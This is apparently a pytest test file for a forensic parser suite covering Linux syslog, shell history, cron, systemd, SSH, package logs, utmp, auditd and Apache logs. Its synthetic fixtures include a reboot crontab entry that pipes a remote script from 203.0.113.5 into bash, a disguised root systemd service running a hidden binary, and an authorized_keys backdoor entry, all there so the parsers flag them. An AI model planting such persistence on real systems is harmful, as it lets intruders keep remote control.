"""Unit tests: Linux parsers (syslog family, shell history, cron, systemd, ssh, package logs,
utmp, auditd, apache)."""
from __future__ import annotations

from collections import Counter

import pytest

from veritas.parsers import apache, auditd, cron, package_logs, shell_history, ssh, syslog, systemd_units, utmp
from veritas.parsers.base import ParserError, Provenance
from veritas.timeline.schema import format_ns


def run(cls, path, **prov):
    p = cls()
    prov.setdefault("evidence_path", str(path))
    events = list(p.parse(str(path), Provenance(**prov)))
    return events, p


def kinds(events):
    return Counter(e.data_type for e in events)


# ---------------------------------------------------------------- syslog
def test_syslog_traditional_with_year_hint(corpus):
    ev, p = run(syslog.SyslogParser, corpus / "plaso/syslog/syslog", year_hint=2012)
    assert len(ev) == 16 and p.warning_count == 0
    assert format_ns(ev[0].timestamp) == "2012-01-22T07:52:33.000000Z"
    assert ev[0].host == "myhostname.myhost.com" and ev[0].attrs["reporter"] == "client"
    assert ev[0].attrs["pid"] == 30840 and ev[0].attrs["year_source"] == "year_hint"
    assert kinds(ev)["syslog:cron:task_run"] == 3
    leap = next(e for e in ev if e.data_type == "syslog:comment")
    assert format_ns(leap.timestamp) == "2012-02-29T01:15:43.000000Z"
    # Month going backwards (Dec -> Mar) rolls the year over.
    assert format_ns(ev[8].timestamp) == "2013-03-23T23:01:18.000000Z"
    assert ev[9].timestamp % 10**9 == 123_000_000  # fractional seconds kept
    multi = next(e for e in ev if e.attrs["reporter"] == "aprocess")
    assert "\n" in multi.attrs["body"]  # continuation line joined


def test_syslog_year_from_mtime_and_default(corpus):
    mtime_2015 = 1_420_070_400 * 10**9 + 10**9  # 2015-01-01
    ev, _ = run(syslog.SyslogParser, corpus / "plaso/syslog/syslog_cron.log", mtime_ns=mtime_2015)
    assert format_ns(ev[0].timestamp).startswith("2015-03-11") and ev[0].attrs["year_source"] == "file_mtime"
    ev, p = run(syslog.SyslogParser, corpus / "plaso/syslog/syslog_cron.log")
    assert format_ns(ev[0].timestamp).startswith("1970-03-11")
    assert any("1970" in w for w in p.warnings)


def test_syslog_ssh(corpus):
    ev, _ = run(syslog.SyslogParser, corpus / "plaso/syslog/syslog_ssh.log", year_hint=2016)
    k = kinds(ev)
    assert k["syslog:ssh:login"] == 5 and k["syslog:ssh:failed_connection"] == 3
    assert k["syslog:ssh:opened_connection"] == 1
    login = next(e for e in ev if e.data_type == "syslog:ssh:login")
    assert (login.attrs["username"], login.attrs["address"], login.attrs["port"]) == ("plaso", "192.168.0.1", 59229)
    assert login.attrs["authentication_method"] == "publickey"
    assert login.attrs["fingerprint"] == "00:aa:bb:cc:dd:ee:ff:11:22:33:44:55:66:77:88:99"
    assert login.user == "plaso"


def test_syslog_sudo_iso(corpus):
    ev, _ = run(syslog.SyslogParser, corpus / "plaso/syslog/syslog_sudo.log")
    assert len(ev) == 29 and kinds(ev)["syslog:sudo:command"] == 20
    s = next(e for e in ev if e.data_type == "syslog:sudo:command")
    assert s.attrs["user"] == "ubuntu" and s.attrs["command"] == "/usr/sbin/auditctl -D"
    assert s.attrs["pwd"] == "/home/ubuntu" and s.attrs["target_user"] == "root" and s.attrs["tty"] is None
    assert s.timestamp == 1785071005682007000 and s.attrs["time_is_local"] is False


def test_syslog_rsyslog_and_rfc5424(corpus):
    ev, _ = run(syslog.SyslogParser, corpus / "plaso/syslog/syslog_rsyslog")
    assert len(ev) == 5 and ev[0].timestamp == 1590883245698463000
    ev, _ = run(syslog.SyslogParser, corpus / "plaso/syslog/syslog_rsyslog_SyslogProtocol23Format")
    assert len(ev) == 9
    assert ev[0].attrs["line_format"] == "rfc5424" and ev[0].attrs["pid"] is None
    assert ev[0].attrs["message_identifier"] == "123"
    assert ev[1].attrs["body"].endswith("with another line")
    assert (ev[1].attrs["severity"], ev[1].attrs["facility"]) == (6, 1)


def test_syslog_cron_and_compressed(corpus):
    ev, _ = run(syslog.SyslogParser, corpus / "plaso/syslog/syslog_cron.log", year_hint=2016)
    assert kinds(ev) == Counter({"syslog:cron:task_run": 9})
    assert ev[1].attrs["command"] == "sleep $(( 1 * 60 )); touch /tmp/afile.txt"
    # Rotated, compressed logs decode transparently and identically across codecs.
    outs = []
    for ext in ("gz", "bz2", "xz"):
        comp, p = run(syslog.SyslogParser, corpus / f"plaso/syslog.{ext}", year_hint=2012, evidence_path="syslog")
        assert len(comp) == 12 and p.warning_count == 0
        outs.append([e.to_json() for e in comp])
    assert outs[0] == outs[1] == outs[2]


# ---------------------------------------------------------------- shell history
def test_bash_history(corpus):
    ev, _ = run(shell_history.BashHistoryParser, corpus / "plaso/bash_history")
    assert [e.timestamp for e in ev][:3] == [1380630977 * 10**9, 1380630978 * 10**9, 1380630979 * 10**9]
    assert ev[0].attrs["command"] == "/usr/lib/plaso"
    assert ev[3].attrs["command"].count("\n") == 3  # multi-line command kept together


def test_bash_history_desync(corpus):
    ev, _ = run(shell_history.BashHistoryParser, corpus / "plaso/bash_history_desync")
    assert len(ev) == 5
    assert ev[0].timestamp is None and ev[0].attrs["has_timestamp"] is False


def test_zsh_and_fish(corpus):
    ev, _ = run(shell_history.ZshHistoryParser, corpus / "plaso/zsh_extended_history.txt")
    assert [e.attrs["command"] for e in ev] == ["cd plaso", "ls", "echo dfgdfg \\\\\n& touch /tmp/afile",
                                                 "PYTHONPATH=. ./runtests.py"]
    assert ev[0].timestamp == 1457771210 * 10**9
    ev, _ = run(shell_history.FishHistoryParser, corpus / "plaso/fish_history")
    assert len(ev) == 10 and ev[0].attrs["command"] == "ll" and ev[0].timestamp == 1619736780 * 10**9
    assert ev[3].attrs["paths"] == ["test"]


# ---------------------------------------------------------------- cron / systemd / ssh (synthetic)
CRONTAB = """# /etc/crontab
SHELL=/bin/sh
PATH=/usr/sbin:/usr/bin
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
@reboot root curl -s http://203.0.113.5/x.sh | bash
*/5 * * * * www-data /usr/bin/php /var/www/cron.php
"""


def test_crontab(tmp_path):
    d = tmp_path / "etc"
    d.mkdir()
    f = d / "crontab"
    f.write_text(CRONTAB)
    ev, _ = run(cron.CrontabParser, f, mtime_ns=1_700_000_000 * 10**9)
    assert len(ev) == 3
    assert ev[0].attrs["schedule"] == "17 * * * *" and ev[0].attrs["user"] == "root"
    assert ev[1].attrs["schedule"] == "@reboot" and ev[1].attrs["suspicious"] is True
    assert ev[2].attrs["user"] == "www-data" and ev[2].attrs["suspicious"] is False
    assert ev[0].attrs["environment"]["SHELL"] == "/bin/sh"
    assert ev[0].timestamp == 1_700_000_000 * 10**9
    user = tmp_path / "var" / "spool" / "cron" / "crontabs"
    user.mkdir(parents=True)
    (user / "alice").write_text("0 3 * * * /home/alice/backup.sh\n")
    ev, _ = run(cron.CrontabParser, user / "alice")
    assert ev[0].attrs["user"] == "alice" and ev[0].timestamp is None and ev[0].timestamp_desc == "Not a time"


UNIT = """[Unit]
Description=Totally legit updater

[Service]
Type=simple
User=root
ExecStartPre=/bin/true
ExecStart=/bin/bash -c \\
  '/dev/shm/.x/upd --quiet'
Restart=always

[Install]
WantedBy=multi-user.target
"""


def test_systemd_unit(tmp_path):
    f = tmp_path / "updater.service"
    f.write_text(UNIT)
    ev, _ = run(systemd_units.SystemdUnitParser, f, mtime_ns=1_650_000_000 * 10**9)
    assert len(ev) == 1
    a = ev[0].attrs
    assert a["unit"] == "updater.service" and a["user"] == "root" and a["wanted_by"] == ["multi-user.target"]
    assert a["exec_start"] == ["/bin/bash -c '/dev/shm/.x/upd --quiet'"]
    assert a["suspicious"] is True and ev[0].data_type == "linux:systemd:unit"
    assert ev[0].timestamp == 1_650_000_000 * 10**9


def test_ssh_files(tmp_path):
    sshdir = tmp_path / ".ssh"
    sshdir.mkdir()
    key = "AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl"
    (sshdir / "authorized_keys").write_text(
        f'command="/usr/bin/backdoor",no-pty ssh-ed25519 {key} attacker@evil\nssh-ed25519 {key} admin@corp\n')
    ev, _ = run(ssh.AuthorizedKeysParser, sshdir / "authorized_keys")
    assert len(ev) == 2
    assert ev[0].attrs["forced_command"] == "/usr/bin/backdoor" and ev[0].attrs["comment"] == "attacker@evil"
    assert ev[0].attrs["fingerprint"].startswith("SHA256:") and ev[1].attrs["options"] == {}
    (sshdir / "known_hosts").write_text(f"github.com,140.82.112.3 ssh-ed25519 {key}\n|1|abc=|def= ssh-ed25519 {key}\n")
    ev, _ = run(ssh.KnownHostsParser, sshdir / "known_hosts")
    assert ev[0].attrs["hosts"] == ["github.com", "140.82.112.3"] and ev[1].attrs["hashed"] is True
    (tmp_path / "sshd_config").write_text("PermitRootLogin yes\nPasswordAuthentication no\nGatewayPorts yes\n")
    ev, _ = run(ssh.SshdConfigParser, tmp_path / "sshd_config")
    assert [e.attrs["risky"] for e in ev] == [True, False, True]
    (sshdir / "config").write_text("Host jump\n  HostName 10.0.0.1\n  User root\n  ProxyCommand nc %h %p\n")
    ev, _ = run(ssh.SshClientConfigParser, sshdir / "config")
    assert ev[0].attrs["host"] == "jump" and ev[0].attrs["hostname"] == "10.0.0.1" and ev[0].attrs["proxycommand"] == "nc %h %p"


# ---------------------------------------------------------------- package logs
def test_dpkg(corpus):
    ev, _ = run(package_logs.DpkgLogParser, corpus / "plaso/dpkg.log")
    assert len(ev) == 4 and ev[0].timestamp == 1235562323000000000
    inst = ev[2]
    assert inst.attrs["action"] == "install" and inst.attrs["package"] == "base-passwd:amd64"
    assert inst.attrs["new_version"] == "3.5.33"


def test_apt_history(corpus):
    ev, _ = run(package_logs.AptHistoryParser, corpus / "plaso/apt_history.log")
    assert len(ev) == 20
    start = ev[0]
    assert start.timestamp_desc == "Start Time" and start.timestamp == 1562776688000000000
    assert start.attrs["command_line"] == "apt-get upgrade --no-install-recommends --assume-yes"
    assert start.attrs["upgrade_packages"][0] == "libdns-export162:amd64 (1:9.10.3.dfsg.P4-12.3+deb9u4, 1:9.10.3.dfsg.P4-12.3+deb9u5)"
    assert any(e.attrs.get("error") for e in ev)


def test_dnf_yum(tmp_path):
    f = tmp_path / "dnf.log"
    f.write_text("2023-05-01T10:00:00+0000 INFO Installed: nmap-7.92-1.x86_64\n")
    ev, _ = run(package_logs.DnfYumLogParser, f)
    assert ev[0].timestamp == 1682935200 * 10**9 and ev[0].attrs["level"] == "INFO"
    f = tmp_path / "yum.log"
    f.write_text("Dec 31 23:00:00 Installed: a-1\nJan 01 01:00:00 Erased: b\n")
    ev, _ = run(package_logs.DnfYumLogParser, f, year_hint=2020)
    assert format_ns(ev[1].timestamp).startswith("2021-01-01") and ev[1].attrs["action"] == "Erased"


# ---------------------------------------------------------------- utmp
def test_utmp(corpus):
    ev, p = run(utmp.UtmpParser, corpus / "plaso/utmp/utmp")
    assert len(ev) == 14 and p.warning_count == 0
    assert ev[0].attrs["type_name"] == "BOOT_TIME" and ev[0].timestamp == 1386945909688666000
    assert ev[-1].attrs["username"] == "moxilo" and ev[-1].attrs["terminal"] == "pts/5"


def test_wtmp_and_corrupted(corpus):
    ev, p = run(utmp.UtmpParser, corpus / "plaso/utmp/wtmp.1")
    assert len(ev) == 2 and ev[0].attrs["ip_address"] == "10.10.122.1" and ev[0].attrs["username"] == "userA"
    assert p.warning_count == 1
    ev, p = run(utmp.UtmpParser, corpus / "plaso/utmp/utmp_corrupted")
    assert [e.attrs["username"] for e in ev] == ["alice", "bob"]
    assert p.warning_count == 3  # two bad records + trailing partial record


def test_utmpx_mac(corpus):
    ev, _ = run(utmp.UtmpxMacParser, corpus / "plaso/utmpx_mac")
    assert len(ev) == 6 and ev[0].attrs["type_name"] == "BOOT_TIME" and ev[0].timestamp == 1384365154000000000
    assert ev[-1].attrs["username"] == "moxilo"


# ---------------------------------------------------------------- auditd / apache
def test_auditd(corpus):
    ev, _ = run(auditd.AuditdParser, corpus / "plaso/audit.log")
    assert len(ev) == 11
    first = ev[0]
    assert first.attrs["record_type"] == "SYSCALL" and first.attrs["serial"] == 500
    assert first.timestamp == 1783478974713000000 and first.attrs["key"] == "specimen_exec"
    assert first.attrs["argv"] == ["id"] and first.attrs["cwd"] == "/home/ubuntu"
    cat = ev[1]
    assert cat.attrs["command_line"] == "/bin/cat /tmp/my report.txt"  # hex-encoded argument decoded
    assert len(cat.attrs["paths"]) == 2
    su = ev[-1]
    assert su.attrs["record_type"] == "USER_START" and su.attrs["acct"] == "specimenuser" and su.attrs["res"] == "success"


def test_auditd_corrupted(corpus):
    ev, _ = run(auditd.AuditdParser, corpus / "plaso/audit_corrupted.log")
    assert len(ev) == 6


def test_apache(corpus):
    ev, p = run(apache.ApacheAccessParser, corpus / "plaso/apache_access.log")
    assert len(ev) == 15 and p.warning_count == 0  # incl. two requests with embedded quotes
    a = ev[1].attrs
    assert a["ip_address"] == "10.1.1.2" and a["http_method"] == "GET" and a["path"] == "/wp-content/themes/darkmode/evil.php"
    assert a["http_response_code"] == 200 and a["http_response_bytes"] == 1063
    assert a["http_request_user_agent"].startswith("Mozilla/5.0 (Macintosh")
    assert ev[0].timestamp == 1452713476000000000


def test_text_parser_rejects_missing_file(tmp_path):
    with pytest.raises(ParserError):
        list(syslog.SyslogParser().parse(str(tmp_path / "nope"), Provenance()))
